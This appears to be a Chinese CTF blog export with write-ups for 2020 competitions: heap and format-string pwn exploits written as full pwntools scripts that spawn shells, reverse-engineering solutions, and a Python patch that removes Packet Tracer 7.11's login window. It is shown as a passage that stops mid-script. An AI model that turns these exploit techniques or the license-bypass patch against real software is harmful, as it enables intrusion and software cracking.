然后尝试合并next_chunk：如果next_chunk是top_chunk，则直接合并到top_chunk，然后进行第六步；如果next_chunk不是top_chunk，尝试合并。 将处理完的chunk插入到unsorted bin头部。 获取下一个空闲的fastbin，回到第二步，直到清空所有fastbin中的chunk，然后退出。 攻击思路 利用scanf函数来触发malloc_consolidate，使相邻fastbin堆块进行合并，并放入unsortedbin的 队列，在堆上留下libc的相关地址 利用fastbin attack ，打__IO_2_1_stdout，泄漏libc 利用fastbin attack ，打malloc_hook 难点在申请堆块的数量,题目限制了19个，是刚刚够用。 expfrom pwn import * import time local_file = './pwn' elf = ELF(local_file) context.log_level = 'debug' debug = 1 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',27411) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(size,name,mes): sla('Your choice :','1') sla('size',str(size)) sa(\"game's name:\",str(name)) sla('mes',str(mes)) def free(idx): sla('Your choice :','2') sla('index:',str(idx)) def leak_addr(): payload = 'a' * 0x28 mes = '2' * 23 add(0x28,payload,mes) #0 add(0x28,payload,mes) #1 add(0x28,payload,mes) #2 free(0) free(1) free(2) add(0x68,payload,mes) #3 add(0x68,payload,mes) #4 add(0x68,payload,mes) #5 add(0x68,payload,mes) #6 free(3) free(4) free(5) # debug() sla('Your choice :','2') sl('1'*0x500) free(0) free(1) free(2) add(0x68,p16(0xb5dd),'1') #7 add(0x68,p16(0xb5dd),'1') #8 free(6) free(7) free(6) add(0x68,p8(0x90),'1') #9 add(0x68,'1','1') #10 add(0x68,'1','1') #11 add(0x68,'1','1') #12 payload = 'b' * 0x33 + p64(0xfbad3c80) + p64(0) * 3 + p8(0) sla('Your choice :','1') sla('size','104') #13 sa('name',payload) leak = 0 while True: try: leak_addr() ss = io.recvuntil(chr(0x7f),timeout = 0.5) if len(ss) == 0: raise Exception('') io.recv(10) leak = uu64(r(6)) if leak == 0x7ff81b57b6a3: raise Exception('') break except Exception: io.close() io = process('./pwn') # io = remote('39.101.184.181',10000) continue info_addr('leak',leak) libc_addr = leak - 0x3c56a3 info_addr('libc_base',libc_addr) ru('age') sl('1') free(10) free(11) free(10) malloc_hook = 0x3c4aed + libc_addr add(0x68,p64(malloc_hook),'1') add(0x68,'1','1') add(0x68,'1','1') one_rec = 0xf0364 + libc_addr payload = '1' * (0x13-8) + p64(0)+ p64(one_rec) add(0x68,payload,'1') free(6) free(6) itr()","categories":[],"tags":[{"name":"re","slug":"re","permalink":"http://chumen77.xyz/tags/re/"},{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"}]},{"title":"2020 “中能融合杯” 部分wp","slug":"2020 “中能融合杯” 部分wp","date":"2020-09-12T09:15:09.106Z","updated":"2020-09-17T09:36:44.436Z","comments":true,"path":"2020/09/12/2020 “中能融合杯” 部分wp/","link":"","permalink":"http://chumen77.xyz/2020/09/12/2020 “中能融合杯” 部分wp/","excerpt":"","text":"工控wpICS_8就是一个算法的逆向。 #!/usr/bin/env python2.7 import struct import base64 cypher_text = 'HgoAVxEfdCRlPytBA1JSHiVOZW4VMURPcANETw==' iv = struct.unpack(\"I\", 'x1a0')[0] def decode(cypher_text,iv): cypher_text = base64.b64decode(cypher_text) padding = 4 - len(cypher_text) % 4 if padding != 0: cypher_text = cypher_text + \"\\x00\" * padding l = cypher_text crypher = struct.unpack(\"I\"*(len(l)/4),l) datas = [] datas += [ decrypto(crypher[0]) ^ iv ] for i in range(1,len(crypher)): datas += [decrypto(crypher[i]) ^ crypher[i-1]] return datas def decrypto(data): return data ^ (data &gt;&gt; 16) datas = decode(cypher_text,iv) flag = \"\" for i in datas: flag += struct.pack(\"I\",i) print flag ICS_9解压以后是一个img，但是发现是损坏的。 file ./ICS_9.img ./ICS_9.img: Linux rev 1.0 ext4 filesystem data, UUID=1385df22-b2ce-4b4f-858e-79ae1932ca1a (extents) (huge files) 可以看到是ext4的文件。然后可以用fsck修复一下： fsck.ext4 ./ICS_9.img e2fsck 1.42.13 (17-May-2015) ext2fs_open2: The ext2 superblock is corrupt fsck.ext4: Superblock invalid, trying backup blocks... ./ICS_9.img was not cleanly unmounted, check forced. Pass 1: Checking inodes, blocks, and sizes Pass 2: Checking directory structure Pass 3: Checking directory connectivity Pass 4: Checking reference counts Pass 5: Checking group summary information Free blocks count wrong for group #0 (6789, counted=488). Fix&lt;y&gt;? yes Free blocks count wrong for group #1 (2006, counted=228). Fix&lt;y&gt;? yes Free blocks count wrong (8795, counted=716). Fix&lt;y&gt;? yes Free inodes count wrong for group #0 (1269, counted=1262). Fix&lt;y&gt;? yes Free inodes count wrong (2549, counted=2542). Fix&lt;y&gt;? yes ./ICS_9.img: ***** FILE SYSTEM WAS MODIFIED ***** ./ICS_9.img: 18/2560 files (11.1% non-contiguous), 9524/10240 blocks 然后进行挂载: mkdir tmp2 sudo mount ICS_9.img tmp2 ; ls -larth tmp2 binwalk fil.enc Scan Time: 2015-03-09 15:35:08 Target File: /tmp/wu/tmp/fil.enc MD5 Checksum: cb84f2cc7d776e83ebe0bd17efa163f4 Signatures: 328 DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 OpenSSL encryption, salted, salt: 0x-6BC6193B4330E12E cat AE5 4[71A3j9[\\22?/+u0 Binwalk 一下，发现enc文件是openssl加密的文件，AE5文件是关于加密算法和密钥。 但是并不知道是哪种模式的加密和密钥的长度的加密，需要写一个脚本测试。这是所有的可能： -aes-128-cbc -aes-128-cbc-hmac-sha1 -aes-128-cfb -aes-128-cfb1 -aes-128-cfb8 -aes-128-ctr -aes-128-ecb -aes-128-gcm -aes-128-ofb -aes-128-xts -aes-192-cbc -aes-192-cfb -aes-192-cfb1 -aes-192-cfb8 -aes-192-ctr -aes-192-ecb -aes-192-gcm -aes-192-ofb -aes-256-cbc -aes-256-cbc-hmac-sha1 -aes-256-cfb -aes-256-cfb1 -aes-256-cfb8 -aes-256-ctr -aes-256-ecb -aes-256-gcm -aes-256-ofb -aes-256-xts -aes128 -aes192 #!/bin/bash KEY=`cat AE5` AES=\"-aes-128-cbc -aes-128-cbc-hmac-sha1 -aes-128-cfb -aes-128-cfb1 -aes-128-cfb8 -aes-128-ctr -aes-128-ecb -aes-128-gcm -aes-128-ofb -aes-128-xts -aes-192-cbc -aes-192-cfb -aes-192-cfb1 -aes-192-cfb8 -aes-192-ctr -aes-192-ecb -aes-192-gcm -aes-192-ofb -aes-256-cbc -aes-256-cbc-hmac-sha1 -aes-256-cfb -aes-256-cfb1 -aes-256-cfb8 -aes-256-ctr -aes-256-ecb -aes-256-gcm -aes-256-ofb -aes-256-xts -aes128 -aes192\" for mode in $AES do openssl enc -d -in fil.enc -out ./tmp3/fil\"$mode\".dec -k $KEY $mode done sudo chmod +x ./1.sh sudo sh 1.sh ICS_11程序上来就告诉一下flag的格式，其中字符的内容是20位。向下走，也会发现有20的相关判断。其上方有个大小判断大于10就退出了，但是flag是20位的，明显需要patch一下： 然后往下分析，发现你输入的东西会跟12位的nemo_pwned_n进行先比较一下，接着: if ( v17 + v18 != 2842152358 || v18 - v17 != 989791556 ) 明显这是都需要进行满足的。然后求解一下： In [6]: hex(926180401) Out[6]: '0x37346431' (v17) In [7]: hex(1915971957) Out[7]: '0x72336975'. (v18) 这样大数据进行判断，其实也是判断字符的，转码一下： 0x37346431:74d1 0x72336975 :r3iu但是因为在内存中，其是小端序的，需要反转一下。猜测flag就是nemo_pwned_n1d47ui3r。其长度正好就是20位。 经过验证的确是的。 ICS_13十分简单，自己输入的东西减去0x14，和10445678951进行一个个字节的比较，相等就ok。 key = '10445678951' key = [ord(c) for c in key] flag = '' for i in key : flag += chr(i+0x14) print(flag) ICS_2先脱壳，esp定律脱壳。也可以用万能脱壳机进行脱。由于给了提示，是需要找一个ip。很简单的思路就是直接找可疑ip。 x32dbg直接断在这里，向下跟。 发现可疑ip，提交就对了。 ICS_14程序就是很简单找到注册码。邮箱可以乱输入，但是要保证@ + xx + . + xx 这里有函数进行控制判断。如果不对就会说，邮箱不合法。接着看流程： 这块在判断一堆东西，推测就是注册码。往上一看，可以看到这一条。 明显是ida无法识别，其是还是一个字符串。 然后就是一个个转字符串，以v12-v27整合一下,BZ9dmq4c8g9G7bAY出来这个。并且可以看到判断就是16位。然后进行输入判断:就很简单成功拿到。","categories":[],"tags":[{"name":"re","slug":"re","permalink":"http://chumen77.xyz/tags/re/"},{"name":"misc","slug":"misc","permalink":"http://chumen77.xyz/tags/misc/"}]},{"title":"实战去除packet tracer登陆窗口","slug":"实战去除packet tracer登陆窗口","date":"2020-09-07T09:11:40.744Z","updated":"2020-09-12T09:14:20.389Z","comments":true,"path":"2020/09/07/实战去除packet tracer登陆窗口/","link":"","permalink":"http://chumen77.xyz/2020/09/07/实战去除packet tracer登陆窗口/","excerpt":"","text":"实战去除思科packet tracer登陆窗口背景专业课开设了路由交换这门课，其中要经常使用packet tracer这个软件，但是没有注册的话，每次登陆都需要等待15s，就尝试破解一下。 目标破除等待的15s，最好直接去除掉登陆窗口。但是老师上课给我们演示过，有个吾爱破解的插件是直接破解掉登陆窗口的，就直接奔着这个目标去。 工具 win7 模拟器 packet tracer 7.11 x64dbg 破解过程记录寻找突破口￼在弹出登陆界面时，最上方会有 netacad.com Login的字眼，先就选择这里作为关键字符串。￼在这个exe的程序下搜索字符串。端口可疑字符串对应的汇编指令。 然后开始f9一直运行，在这个netacad.com Login，运行其后的软件会发现，的确开启了登陆的窗口。这样就可以确定，关键处就在这里。向下看可以看到，一些登陆失败的字符串，那就无疑是这一块的函数控制着这个登陆窗口。 向上看可以看到，有几个小跳转，和一个大跳转，然后追过去可以发现，是可以绕过这些关键函数的。那就很简单了，尝试改成jmp 无条件跳转一下试一试。 然后直接运行一下，然后的确是成功了，去掉了登陆框。 然后进行保存补丁，替换主程序即可。 小总结的确是找到了关键处，感觉整个过程还是很简单的，由于前人经验就是从登陆界面下手的，我也是直接跟随这个思路操作。在完工以后，尝试去搞一下15s哪里的验证，想点一下直接变为0s，可以点击确认，发现是的确麻烦也没有成功就放弃了。 半自动化打补丁不太会写c，用python 写了打补丁的程序，确保本机有python2的运行环境。然后把脚本放在其安装路径的bin目录下，运行即可。 也可以把程序拖出来，打完补丁后替换原来的程序即可。 #!/usr/bin/env python2.7 import struct import os def WriteFile(): with open('PacketTracer7.exe','r') as f: dt = f.read() dt = dt[:0x17a5245]+'\\xe9\\xee\\x04\\x00\\x00\\x90'+dt[0x17a524b:] with open('PacketTracer7.exe', 'w') as f: f.write(dt) if __name__ == '__main__': WriteFile() 针对的只是7.11。","categories":[],"tags":[{"name":"re","slug":"re","permalink":"http://chumen77.xyz/tags/re/"}]},{"title":"强网杯2020部分题目","slug":"强网杯2020部分题目","date":"2020-08-24T02:34:05.216Z","updated":"2020-09-23T12:02:35.653Z","comments":true,"path":"2020/08/24/强网杯2020部分题目/","link":"","permalink":"http://chumen77.xyz/2020/08/24/强网杯2020部分题目/","excerpt":"","text":"强网杯2020 部分题目babymessage分析Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x3fe000) 基本保护不算多。 是一个伪堆题。 漏洞点在 leave_message(v1)函数这里的v1上来取值就是16 __int64 __fastcall leave_message(unsigned int a1) &#123; int v1; // ST14_4 __int64 v3; // [rsp+18h] [rbp-8h] puts(\"message: \"); v1 = read(0, &amp;v3, a1); strncpy(buf, (const char *)&amp;v3, v1); buf[v1] = 0; puts(\"done!\\n\"); return 0LL; &#125; 进入以后可以发现，v3是只有8字节大小的，可以溢出8字节，可以覆盖到rbp。 用途.text:0000000000400985 ; 22: if ( v1 &gt; 256 ) .text:0000000000400985 cmp [rbp+var_4], 100h .text:000000000040098C jle short loc_400995 .text:000000000040098E ; 23: v1 = 256; .text:000000000040098E mov [rbp+var_4], 100h .text:0000000000400995 ; 24: leave_message(v1); 在进入leave_message(v1)前v1有一个对于0x100大小的判断，要是v1大于0x100就给设置为0x100。这就可以实现栈溢出，进行rop。 怎么控制v1： signed int v1; // [rsp+Ch] [rbp-4h] 可以明显看到v1在rbp-4的地址，然后rbp，也可以进行溢出覆盖，覆盖到合适的地方后，保障-4后，有个int大小的大于等于0x100的值即可。 这个合适地址，可以从leave_name() 下手，因为其往bss段读了值。 byte_6010D0[(signed int)read(0, byte_6010D0, 4uLL)] = 0; 攻击 构造rop链，泄漏出libc的地址，返回start，让程序重新跑起来，清理栈 再次利用，控制ret address 为one_gadget expfrom pwn import * import time local_file = './babymessage' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('123.56.170.202',21342) libc = elf.libc libc = ELF('./libc-2.27.so') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce18 = [0x4f2c5,0x4f322,0x10a38c] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() pop_rdi = 0x0000000000400ac3 start = 0x04006E0 sla('choice','1') sa('name',p32(0xffff)) sla('choice','2') payload = p64(0x02000200) + p64(0x06010D0+4) sa('mes',payload) sla('choice','2') rop = flat([pop_rdi,elf.got['__libc_start_main'],elf.plt['puts'],start]) payload = p64(0x02000200) + p64(0x06010D0+4) payload +=rop sa('mes',payload) ru('done!') r(2) libc_base = uu64(r(6)) - libc.sym['__libc_start_main'] info_addr('libc_base',libc_base) sla('choice','1') sa('name',p32(0xffff)) sla('choice','2') # debug() payload = p64(0x02000200) + p64(0x06010D0+4) sa('mes',payload) rec = 0x10a45c + libc_base sla('choice','2') rop = p64(rec) payload = p64(0x02000200) + p64(0x06010D0+4) payload +=rop sa('mes',payload) itr() flag&#123;f4c1c2c2407055f2665dec486e7d1b16&#125; Siri分析保护全开。栈上的格式化字符串漏洞，并且可以无限次触发。 漏洞点signed __int64 __fastcall sub_1212(const char *a1) &#123; char *v2; // [rsp+18h] [rbp-128h] char s; // [rsp+20h] [rbp-120h] unsigned __int64 v4; // [rsp+138h] [rbp-8h] v4 = __readfsqword(0x28u); v2 = strstr(a1, \"Remind me to \"); if ( !v2 ) return 0LL; memset(&amp;s, 0, 0x110uLL); sprintf(&amp;s, \"&gt;&gt;&gt; OK, I'll remind you to %s\", v2 + 13); printf(&amp;s); puts(&amp;::s); return 1LL; &#125; 发现存在格式化字符串，但是你所输入的都会被sprintf处理以后给printf函数。由于其是%s来处理数据，这就让直接在栈上写地址，然后攻击造成了难度。但是调试可以发现，其实输入的东西还会保留在栈上，因为sprintf处理数据也是从栈上拿的，所以会被保留的。 攻击 第一次触发，泄漏出libc地址，stack地址。 执行到printf准备触发格式化字符串漏洞时，用sprintf残留栈上的数据（在0x100后），这个需要精心构造好后，进行攻击ret address。需要一次性改好。 expfrom pwn import * import time local_file = './pwn' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('123.56.170.202',12124) # libc = elf.libc libc = ELF('./libc.so.6') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] rce18 = [0x4f2c5,0x4f322,0x10a38c] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): gdb.attach(io) pause() def start_attc(): sla('&gt;&gt;','Hey Siri!') r() a = 'Remind me to ' start_attc() payload = str(a) + '%83$p' + 'bbb' + '%7$p' # ru('&gt;&gt;&gt;') s(payload) ru('0x') libc_base = int(r(12),16) - 0x21b97 info_addr('libc_base',libc_base) ru('bbb0x') stack_base = int(r(12),16) - 0x150 info_addr('stack_base',stack_base) tag = stack_base + 0x148 start_attc() def fmt_short(prev,val,idx,byte = 2): result = \"\" if prev &lt; val : result += \"%\" + str(val - prev) + \"c\" elif prev == val : result += '' else : result += \"%\" + str(256**byte - prev + val) + \"c\" result += \"%\" + str(idx) + \"$hn\" return result prev = 27 fmtpayload = \"\" key = 0x4f365 + libc_base info_addr('key',key) for i in range(3): fmtpayload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,55+i) prev = (key &gt;&gt; i*16) &amp; 0xffff print(fmtpayload) payload = str(a) + fmtpayload payload +='aaa' + 'b' + p64(tag)[0:6] + '\\x00'*2 + p64(tag+2)[0:6] + '\\x00'*2 + p64(tag+4)[0:6] + '\\x00'*2 + p64(tag+6)[0:6] + '\\x00'*2 s(payload) itr() flag&#123;da8836b9e9df3db44fe4bd7f39d4f7ab&#125; water_reIda反编译后的代码比较难看，发现重点数据造成了困难，就采取动态调试。 基本流程就是，gets一段你输入的flag，读入后用sub_12f0_进行处理，然后给v10 v11 v12 v13 判断是否相等。其实也就是一个个字符来进行对比。 sub_12F0_加密函数_BYTE *__fastcall sub_12F0(_BYTE *a1) &#123; _BYTE *result; // rax int v2; // esi __int64 v3; // r8 __int64 v4; // rdx __int64 v5; // rax int v6; // ecx char v7; // r8 char v8; // dl __asm &#123; endbr64 &#125; result = (_BYTE *)sub_1090(); if ( (signed int)result &lt;= 0 ) return result; v2 = (signed int)result; v3 = (unsigned int)((_DWORD)result - 1); v4 = 0LL; do &#123; a1[v4] = (a1[v4] ^ byte_4010[(unsigned int)v4 % 7]) + 65; v5 = v4++; &#125; while ( v3 != v5 ); v6 = 0; do &#123; v7 = a1[3]; result = a1 + 3; do &#123; v8 = *(result-- - 1); result[1] = v8; &#125; while ( a1 != result ); v6 += 4; *a1 = v7; a1 += 4; &#125; while ( v2 &gt; v6 ); return result; &#125; 动态调试，进行起来很容易看懂。上来就是一个对输入的东西进行一个与byte_4010的字符&#39;Q&#39;, &#39;W&#39;, &#39;B&#39;, &#39;l&#39;, &#39;o&#39;, &#39;g&#39;, &#39;s&#39; 7组来进行一个异或和+65。 然后下面： while ( v3 != v5 ); v6 = 0; do &#123; v7 = a1[3]; result = a1 + 3; do &#123; v8 = *(result-- - 1); result[1] = v8; &#125; while ( a1 != result ); v6 += 4; *a1 = v7; a1 += 4; &#125; 只看着让人头大，输入flag{11111111111111111111111111111111111111111} 动态调试一下发现： 分析这2组数据就会发现，每次对4个数据为一组进行处理。处理后结果就是原来的： v1 &gt; v2 &gt; v3 &gt; v4 变为 v4 &gt; v1 &gt; v2 &gt; v3 这样的结果。 然后处理完就给v10 v11 v12 v13 判断是否相等。这肯定为一串处理过的字符串，ida中也可以找到，直接提取有点害怕提取错，动调时提取一下出来： tag1=[0x4C, 0x78, 0x7C, 0x64, 0x54, 0x55, 0x77, 0x65, 0x5C, 0x49, 0x76, 0x4E, 0x68, 0x43, 0x42, 0x4F, 0x4C, 0x71, 0x44, 0x4E, 0x66, 0x57, 0x7D, 0x49, 0x6D, 0x46, 0x5A, 0x43, 0x74, 0x69, 0x79, 0x78, 0x4F, 0x5C, 0x50, 0x57, 0x5E, 0x65, 0x62, 0x44] 也就是这一段数据。 exp自己直接手动替换的数据。 tag1=[0x4C, 0x78, 0x7C, 0x64, 0x54, 0x55, 0x77, 0x65, 0x5C, 0x49, 0x76, 0x4E, 0x68, 0x43, 0x42, 0x4F, 0x4C, 0x71, 0x44, 0x4E, 0x66, 0x57, 0x7D, 0x49, 0x6D, 0x46, 0x5A, 0x43, 0x74, 0x69, 0x79, 0x78, 0x4F, 0x5C, 0x50, 0x57, 0x5E, 0x65, 0x62, 0x44] tag2 = [0x78, 0x7C, 0x64,0x4C, 0x55, 0x77, 0x65,0x54, 0x49,0x76, 0x4E,0x5C, 0x43, 0x42, 0x4F,0x68, 0x71, 0x44, 0x4E,0x4C, 0x57, 0x7D, 0x49,0x66, 0x46, 0x5A, 0x43,0x6D, 0x69,0x79, 0x78, 0x74, 0x5C, 0x50, 0x57, 0x4F, 0x65, 0x62, 0x44,0x5E] qwkey = ['Q', 'W', 'B', 'l', 'o', 'g', 's'] flag = '' i = 0 j = 0 for i in range(len(tag2)): if j ==7: j = 0 flag += chr((tag2[i] - 65) ^ ord(qwkey[j % 7])) j += 1 print(str(flag)) 估计没有提取全，但是也很容易知道flag了。 flag&#123;QWB_water_problem_give_you_the_score&#125; Just_a_Galgame分析题目提醒了是house of orange，那就想着这样利用即可。现在house of orange的思想，统指主要是针对没有free的堆题，其改top chunk，然后申请一个大点的chunk，来进行获取一个进入unsortbin 的堆块。没有如最早的很经典的利用unsortbin attack 和 io 结合来获取shell。 题目的case2 Invite her to go to a movie. 中： printf(\"movie name &gt;&gt; \", &amp;buf); v4 = atoi((const char *)&amp;buf); read(0, (void *)(qword_404060[v4] + 0x60), 0x10uLL); 由于其是在加0x60之后读取，且在case 1 只是malloc(0x68)，所以在此处可以溢出8个字节，改写到 top chunk。 并且case3： puts(\"You are the apple of my eyes too!\"); qword_404098 = (__int64)malloc(0x1000uLL); ++v12; 可以给你申请0x1000的堆块，这就可以实现了house of orange。 在case5中： puts(\"\\nHotaru: Won't you stay with me for a while? QAQ\\n\"); read(0, &amp;key, 8uLL); 会给0x4040A0 读一段数据。 是紧挨着堆块的。然而在case2中在edit时也没有对堆块序号的检查,让个人输入个8 即可取到这里，进行编辑。 攻击思路 house of orange来获取一个unsortbin 申请一个堆块，会在这个old top chunk中，切出一个堆块，其上会存在libc的相关地址 show一下，泄漏出libc base leave __malloc_hook - 0x60的地址在key 处，然后进行编辑这里的数据。 expfrom pwn import * import time local_file = './Just_a_Galgame' elf = ELF(local_file) context.log_level = 'debug' debug = 1 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',27411) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] rce18 = [0x4f2c5,0x4f322,0x10a38c] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def edit(idx,data): sla(\"&gt;&gt;\",'2') sla('idx',str(idx)) sa('name',str(data)) def show(): sla('&gt;&gt;','4') def add(): sla('&gt;&gt;','1') def add100(): sla('&gt;&gt;','3') def leave(buf): sla('&gt;&gt;','5') s(str(buf)) add() payload = '\\x00'*8 + p64(0xd41) edit(0,payload) add100() add() show() ru('1: ') libc_base = uu64(r(6)) - 0x3ec2a0 info_addr('libc',libc_base) leave(p64(libc_base + 0x3ebc30 - 0x60)) one_rec = 0x4f3c2 + libc_base edit(8,p64(one_rec)) add() itr() 还是挺简单的，比赛时竟然没有看这个题。 easypwn分析if ( !mallopt(1, 0) ) exit(-1); 禁用了fastbin，原理就是修改global_max_fast = 0x10 存在off by null 没有show功能 思路 利用off by null ，修改unsorted bin 的bk为global_max_fast - 0x10 利用unsorted bin 攻击 global_max_fast 接着fastbin attack 打io file的stdout，泄漏libc 接着fastbin attack打 malloc_hook 为one gadget expfrom pwn import * import time local_file = './easypwn' elf = ELF(local_file) context.log_level = 'debug' debug = 1 if debug: io = process(local_file) libc = elf.libc else: io = remote('39.101.184.181',10000) libc = elf.libc # libc = ELF('./libc-easypwn.so') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(size): sla('choice','1') sla('size',str(size)) def edit(idx,data): sla('choice','2') sla('idx',str(idx)) sa('tent',str(data)) def delete(idx): sla('ice','3') sla('idx',str(idx)) def leak_addr(): add(0x30) #0 add(0x98) #1 add(0xf0) #2 add(0x98) #3 add(0x40) delete(0) #null off by one edit(1,'d'*0x90 + p64(0xa0 + 0x40)) delete(2) add(0xe8 - 0x30) add(0xe8) add(0x20) delete(2) payload = p64(0) * 7 * 2 + p64(0) + p64(0xf1) +p64(0)+ p16(0x57f8- 0x10) + '\\n' edit(1,payload) add(0xe8) delete(2) payload = p64(0) * 7 * 2 + p64(0) + p64(0xf1) + p16(0x45cf) + '\\n' edit(1,payload) add(0xe8) add(0xe8) edit(6, 'b' * 0x41 + p64(0xfbad3c80) + p64(0) * 3 + p8(0) + '\\n') leak = 0 while True: try: leak_addr() ss = io.recvuntil(chr(0x7f),timeout = 0.5) if len(ss) == 0: raise Exception('') io.recv(10) leak = uu64(r(6)) if leak == 0x7ff81b57b6a3: raise Exception('') break except Exception: io.close() io = process('./easypwn') # io = remote('39.101.184.181',10000) continue info_addr('leak',leak) libc_addr = leak - 0x3c56a3 info_addr('libc_base',libc_addr) delete(2) edit(1, p64(0) * 7 * 2 + p64(0) + p64(0xf1) + p64(libc_addr + libc.symbols['_IO_2_1_stdin_'] + 143) + '\\n') add(0xe8) add(0xe8) edit(7,'\\0' * 0xe1 + p32(0xf1) + '\\n') delete(2) edit(1, p64(0) * 7 * 2 + p64(0) + p64(0xf1) + p64(libc_addr + libc.symbols['_IO_2_1_stdin_'] + 376) + '\\n') add(0xe8) add(0xe8) rec = libc_addr + 0xf0364 # realloc = libc_addr + libc.symbols['realloc'] + realloc[1] payload = '\\x00' * 0xa0 + p64(rec) + p64(rec) + '\\n' edit(8, payload) info_addr('libc_base',libc_addr) add(0xe8) itr() # 0x45226 execve(\"/bin/sh\", rsp+0x30, environ) # constraints: # rax == NULL # 0x4527a execve(\"/bin/sh\", rsp+0x30, environ) # constraints: # [rsp+0x30] == NULL # 0xf0364 execve(\"/bin/sh\", rsp+0x50, environ) # constraints: # [rsp+0x50] == NULL # 0xf1207 execve(\"/bin/sh\", rsp+0x70, environ) # constraints: # [rsp+0x70] == NULL babynote分析regist()strcpy(name, &amp;s); __isoc99_scanf(\"%lld\", &amp;age1); // 长整数 可能造成溢出。在栈中，其下面紧挨着age。 在bss段，其下面紧挨着heap存放的地址。 addnote() 只能申请6个堆。 申请了一个堆，其size放在距离其堆地址·6 * 8的位置。 可以根据堆序号申请堆，判断堆序号是否存在的依据：此堆对应的size位有没有数值（也适用于shownote，deletenote,editnote）deletenote() if ( v1 &lt;= 3 ) // 可以输入负数 &#123; if ( *(_QWORD *)&amp;m[4 * (v1 + 0xALL)] ) &#123; free(*(void **)&amp;m[4 * (v1 + 4LL)]);// 反编译错了 是8 *（xx） *(_QWORD *)&amp;m[4 * (v1 + 0xALL)] = 0LL;//uaf heap没有清0,size 清0 puts(\"Done!\"); &#125; 存在uaf 只能删除idx&lt;=3 的堆 可以输入负堆号，可以根据其逻辑来删除一些特殊的堆 editnote()if ( v1 &lt;= 3 &amp;&amp; v1 &gt;= 0 ) 只能编辑前4个堆 攻击思路 leak libc free(-1) free(-2) 删除掉motto name的堆块 利用reset，调用regist，利用strcpy来溢出age的数值，控制第一个chunk的size，造成一个堆块重叠 删除0、1、2chunk，申请一个大的chunk，可以覆盖到chunk 1的fd从而修改，进行fastbin attack 打malloc hook 为 one gadget expfrom pwn import * import time local_file = './babynotes' elf = ELF(local_file) context.log_level = 'debug' debug = 1 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',27411) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True 